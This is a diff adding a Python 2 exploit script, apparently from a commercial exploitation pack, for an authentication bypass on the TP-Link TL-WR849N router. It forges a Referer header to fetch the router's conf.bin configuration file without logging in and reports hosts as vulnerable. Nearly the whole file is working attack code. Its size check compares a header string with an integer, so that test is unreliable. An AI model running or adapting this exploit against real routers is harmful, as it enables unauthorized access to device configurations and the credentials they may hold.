@@ -1,0 +1,45 @@
+#! /usr/bin/env python2
+ 
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2020
+#
+
+###
+# STD modules
+###
+import os, sys, re
+import requests
+
+_name_   = 'd2sec_tplink_4'
+_vendor_ = 'tp-link'
+_model_  = ['TL-WR849N']
+_vuln_   = 'Authentication Bypass Vulnerability'
+_cve_    = ''
+_ref_    = 'https://fireshellsecurity.team/hack-n-routers/'
+_port_   = 80
+
+def pwnrouter(host,port=_port_):
+  try:
+    target = 'http://%s:%d/' % (host,port) 
+    headers = {'Referer': target+'mainFrame.htm'}
+    url = target+'cgi/conf.bin'           
+    response = requests.get(url, headers=headers)      
+  except Exception, e:
+    print '[-] error : %s' % e
+    return
+  
+  if ('content-length' in response.headers) and (response.status_code == 200):
+    length = response.headers['content-length']
+    if length > 5000:    
+        print '[+] %s vulnerable'%host
+        print '[+] conf.bin can be downloaded here: %s\n'%url
+        return
+
+  print '[+] %s not vulnerable' % host
+    
+
+if __name__ == "__main__":
+  pwnrouter(sys.argv[1], int(sys.argv[2]))
